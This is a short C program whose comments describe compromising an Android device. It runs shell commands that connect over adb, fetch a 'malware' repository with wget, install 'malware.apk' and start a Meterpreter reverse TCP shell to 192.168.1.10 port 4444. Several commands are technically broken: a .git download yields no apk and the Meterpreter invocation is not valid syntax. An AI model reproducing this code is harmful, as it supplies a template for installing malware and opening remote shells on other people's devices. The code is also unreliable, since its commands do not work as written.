#include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h>   // Function to execute system command void exec_command(char *command) {     char buffer[100];     FILE *pipe = popen(command, "r");       while (fgets(buffer, sizeof(buffer), pipe) != NULL)         printf("%s", buffer);       pclose(pipe); }   int main() {     char command[100] = "adb connect && adb shell";       // Execute command     exec_command(command);       // Downloading malware     char download[] =         "wget https://github.com/malware.git";       // Execute download command     exec_command(download);       // Installing malware     char install[] = "adb install malware.apk";       // Execute install command     exec_command(install);       // Setting up reverse shell     char reverse_shell[] =         "meterpreter -p android reverse_tcp "        "192.168.1.10 4444";       // Execute reverse shell command     exec_command(reverse_shell);       return 0; }
